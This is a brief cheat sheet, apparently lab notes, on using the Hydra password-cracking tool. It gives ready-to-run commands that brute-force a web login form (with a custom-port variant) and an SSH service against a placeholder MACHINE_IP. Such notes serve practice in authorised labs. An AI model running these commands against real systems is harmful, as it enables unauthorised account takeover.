Hydra is a brute force online password cracking program, a quick system login password “hacking” tool.

Hydra command to brute force a POST login form:
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

If the web server is listening on a non-default port number, you can explicitly specify the port number using -s <port>, for example
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V

SSH
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
